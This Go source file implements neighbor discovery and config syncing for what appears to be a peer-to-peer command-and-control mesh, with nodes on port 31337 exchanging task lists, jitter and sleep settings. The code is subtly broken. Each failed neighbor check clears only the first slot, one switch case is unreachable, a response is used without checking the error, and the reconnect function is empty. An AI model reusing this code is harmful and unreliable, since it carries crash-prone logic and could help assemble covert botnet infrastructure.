package main

import (
	"encoding/json"
	"fmt"
	"io"
	"math/rand/v2"
	"net/http"
	"strings"
	"time"
)

func checkNeighbors() {
	checkFailure := false
	if neighborSearchTimeoutExpiration.Before(time.Now()) {
		neighborSearchTimeout = false
	}
	if !neighborSearchTimeout {
		var resp *http.Response
		var err error
		//check to see if /api returns 200 status code for each server
		if configuration.Neighbors[0] != "" {
			resp, err = http.Get("http://" + configuration.Neighbors[0] + ":31337/api")
			if err != nil {
				fmt.Print(err)
			}
			if resp.StatusCode != 200 {
				configuration.Neighbors[0] = ""
				checkFailure = true
			}
		}

		if configuration.Neighbors[1] != "" {
			resp, err = http.Get("http://" + configuration.Neighbors[1] + ":31337/api")
			if err != nil {
				fmt.Print(err)
			}
			if resp.StatusCode != 200 {
				configuration.Neighbors[0] = ""
				checkFailure = true
			}
		}

		if configuration.Neighbors[2] != "" {
			resp, err = http.Get("http://" + configuration.Neighbors[2] + ":31337/api")
			if err != nil {
				fmt.Print(err)
			}
			if resp.StatusCode != 200 {
				configuration.Neighbors[0] = ""
				checkFailure = true
			}
		}
	}

	if checkFailure {
		sendReconnect()
	}
	//true->move on, everything is fine
	//false->ask another server for new neighbors
	//still false->set a one hour timeout and hope that a valid server attempts to pull
	return
}

func generateNewConfig() Config {
	newConfiguration := Config{}
	option := rand.IntN(2)
	switch option {
	case 0:
		newConfiguration.Neighbors[1] = configuration.Neighbors[0]
		newConfiguration.Neighbors[2] = configuration.Neighbors[1]
	case 1:
		newConfiguration.Neighbors[1] = configuration.Neighbors[1]
		newConfiguration.Neighbors[2] = configuration.Neighbors[2]
	case 2:
		newConfiguration.Neighbors[1] = configuration.Neighbors[0]
		newConfiguration.Neighbors[2] = configuration.Neighbors[2]
	}
	newConfiguration.CommandEOL = configuration.CommandEOL
	newConfiguration.JitterValue = configuration.JitterValue
	newConfiguration.SleepTimer = configuration.SleepTimer
	newConfiguration.TaskList = configuration.TaskList
	newConfiguration.LastUpdate = configuration.LastUpdate
	newConfiguration.KnownNodes = configuration.KnownNodes
	return newConfiguration
}

// Attempts to add add a node as a neighbor if necessary.
func processNewNode(address string) bool {
	if (address != configuration.Neighbors[0]) && (address != configuration.Neighbors[1]) && (address != configuration.Neighbors[2]) {
		if configuration.Neighbors[0] == "" {
			configuration.Neighbors[0] = address
		} else if configuration.Neighbors[1] == "" {
			configuration.Neighbors[1] = address
		} else if configuration.Neighbors[2] == "" {
			configuration.Neighbors[2] = address
		}
		neighborSearchTimeout = false
		checkNeighbors()
		return true
	}
	return false
}

func sendReconnect() {

}

func updateInformation() {
	randVal := rand.IntN(3)
	pullURL := "http://" + configuration.Neighbors[randVal] + ":31337/api/pull"
	resp, _ := http.Get(pullURL)
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		checkNeighbors()
	}
	json.Unmarshal(body, &configuration)
	defer resp.Body.Close()
	fmt.Println(resp.Request.Body)
}

func broadcastUUID() {
	//Attempt to post the new UUID to each known server
	var url string
	client := &http.Client{}

	if configuration.Neighbors[0] != "" {
		url = "http://" + configuration.Neighbors[0] + ":31337/api/join"
		r, _ := http.NewRequest(http.MethodPost, url, strings.NewReader(configuration.Identifier.String()))
		client.Do(r)
	}
	if configuration.Neighbors[1] != "" {
		url = "http://" + configuration.Neighbors[1] + ":31337/api/join"
		r, _ := http.NewRequest(http.MethodPost, url, strings.NewReader(configuration.Identifier.String()))
		client.Do(r)
	}
	if configuration.Neighbors[2] != "" {
		url = "http://" + configuration.Neighbors[2] + ":31337/api/join"
		r, _ := http.NewRequest(http.MethodPost, url, strings.NewReader(configuration.Identifier.String()))
		client.Do(r)
	}
}
